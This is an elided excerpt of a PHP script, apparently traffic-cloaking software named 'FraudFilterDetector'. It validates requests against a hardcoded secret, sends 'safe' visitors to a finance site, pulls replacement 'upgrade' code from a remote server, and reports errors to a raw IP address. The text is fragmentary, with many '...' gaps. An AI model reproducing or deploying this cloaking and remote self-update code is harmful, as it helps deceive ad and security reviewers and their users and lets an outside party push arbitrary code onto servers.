...
class FraudFilterDetector_gfnmu {
    ...
    function isSignatureValid($sign, $time) {
        $str = '54037437-8800-413b-b81b-67345f529789.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.finxservices.com/');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 54037437-8800-413b-b81b-67345f529789',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 54037437-8800-413b-b81b-67345f529789';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 54037437-8800-413b-b81b-67345f529789';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=gfnmu&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_gfnmu = new FraudFilterDetector_gfnmu();
$fraudFilterDetector_gfnmu->check();
